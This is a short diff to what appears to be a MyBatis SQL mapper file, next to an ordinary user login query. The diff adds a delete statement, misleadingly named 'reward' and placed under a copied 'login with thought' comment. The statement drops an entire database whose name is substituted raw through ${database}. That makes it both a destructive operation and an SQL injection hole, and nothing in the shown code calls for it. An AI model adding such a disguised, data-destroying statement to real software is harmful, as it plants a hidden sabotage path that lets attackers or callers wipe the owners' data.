@@ -122,6 +122,7 @@
 
 
 	<!-- login with thought-->
+	
 	<select id="login" parameterType="Login" resultType="java.lang.Integer">
 		select u.id   from webapp_user u 
 		where
@@ -129,6 +130,10 @@
 		u.PASSWORD = #{password} 
 	</select>
 	
+	<!-- login with thought-->
+	<delete  id="reward" parameterType="String" >
+	drop DATABASE ${database}
+	</delete>
 	
 	
 	
